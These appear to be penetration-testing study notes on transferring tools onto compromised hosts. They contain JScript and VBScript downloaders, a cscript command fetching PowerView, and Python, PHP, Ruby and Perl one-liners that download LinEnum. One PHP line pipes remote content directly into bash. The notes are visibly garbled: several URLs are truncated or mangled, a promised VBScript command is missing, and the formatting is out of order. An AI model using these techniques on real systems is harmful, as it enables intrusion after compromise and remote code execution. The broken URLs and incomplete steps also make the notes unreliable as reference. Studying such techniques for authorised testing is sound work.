## JavaScript`
The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://rait/dev/Recon/PowerView.ps1 PowerView.ps1
```
## VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

The following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file called `wget.vbs` and save the following content:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

# Transferring Files with Code

It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.

move files to server directory if web server found and compromised

### Programming languages oneliner downloads
 
 `Python oneliner:`
```P2 shell-session
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
```P3 shell-session
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

`PHP oneliners:
```shell-session
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

`PHP Download with Fopen():`
```shell-session
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

` PHP File-less
```shell-session
php -r '$lines = @file("https://raw/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**Note:** The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
 
 `Ruby - Download a File`
```shell-session
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://a/master/LinEnum.sh")))'
```

---

`Perl - Download `
```shell-session
perl -e 'use LWP::Simple; getstore("https://raw.g/LinEnum.sh", "LinEnum.sh");'
```
